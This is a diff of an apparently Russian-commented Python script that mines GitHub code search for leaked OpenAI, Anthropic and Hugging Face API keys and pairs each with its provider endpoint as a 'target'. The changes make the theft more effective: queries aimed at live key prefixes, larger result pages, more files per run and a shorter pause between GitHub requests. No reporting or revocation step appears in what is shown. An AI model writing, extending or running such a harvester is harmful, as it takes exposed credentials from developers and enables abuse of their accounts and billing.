@@ -100,20 +100,36 @@ def get_urls_from_repo_configs(repo):
 def fetch_targets():
     logger.info("🔎 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
-    queries = ["sk- language:Python", "sk- language:JavaScript", "sk- language:TypeScript", "hf_ language:Python"]
+    
+    # Ищем конкретные префиксы живых ключей, а не просто "sk-"
+    queries = [
+        "sk-proj- language:Python", 
+        "sk-ant-api03- language:Python", 
+        "sk-proj- language:JavaScript",
+        "hf_ language:JSON", 
+        "sk- language:JSON", 
+        "sk- language:YAML"
+    ]
     query = random.choice(queries)
-    page = random.randint(1, 5)
+    page = random.randint(1, 10) # Расширили страницы
     
     try:
-        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 30, "page": page}, timeout=15)
-        if resp.status_code == 403: return []
+        resp = requests.get("https://api.github.com/search/code", headers=headers, params={"q": query, "per_page": 50, "page": page}, timeout=15)
+        if resp.status_code == 403:
+            logger.error("❌ 403: Лимит GitHub или неверный токен.")
+            return []
         resp.raise_for_status()
-        items = resp.json().get("items", [])
-        targets = []
         
-        for item in items[:15]:
+        items = resp.json().get("items", [])
+        logger.info(f"✅ Найдено файлов на странице {page}: {len(items)}")
+        
+        targets = []
+        # Обрабатываем до 30 файлов за раз, чтобы быстрее набивать статистику
+        for item in items[:30]:
             repo = item["repository"]["full_name"]
             path = item["path"]
+            
+            # Быстрый запрос файла (без лишних пауз)
             file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
             
             if file_resp.status_code == 200:
@@ -131,11 +147,15 @@ def fetch_targets():
                                 match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                                 if match_url: api_urls.append(match_url.group(1))
                             
-                            # 2. URL в конфигах репо
-                            if not api_urls:
-                                api_urls.extend(get_urls_from_repo_configs(repo)[:2])
+                            # 2. Если ключ от известного провайдера, не тратим время на конфиги!
+                            if not api_urls and p["provider"] in ["openai", "anthropic", "huggingface"]:
+                                api_urls.append(PROVIDER_ENDPOINTS[p["provider"]])
                             
-                            # 3. Название переменной (только если нет URL!)
+                            # 3. Если ключ generic, ищем в конфигах
+                            if not api_urls:
+                                api_urls.extend(get_urls_from_repo_configs(repo)[:1]) # Берем только 1
+                            
+                            # 4. Переменная
                             if not api_urls:
                                 var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
                                 var_name = var_match.group(1).lower() if var_match else ""
@@ -147,19 +167,21 @@ def fetch_targets():
                                     if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                     elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                             
-                            # 4. Название репо
+                            # 5. Название репо
                             if not api_urls:
                                 combined = (repo + " " + path).lower()
                                 for hint, url in REPO_HINTS.items():
                                     if hint in combined: api_urls.append(url); break
                                     
-                            # 5. Дефолт по префиксу
+                            # 6. Дефолт
                             if not api_urls:
                                 api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
                                 
-                            for url in list(set(api_urls))[:2]:
+                            for url in list(set(api_urls))[:1]: # Берем только 1 лучший URL
                                 targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-            time.sleep(1)
+            
+            # Убрали time.sleep(1), GitHub API выдержит быстрый парсинг
+            time.sleep(0.2) 
             
         unique_targets = []
         seen = set()
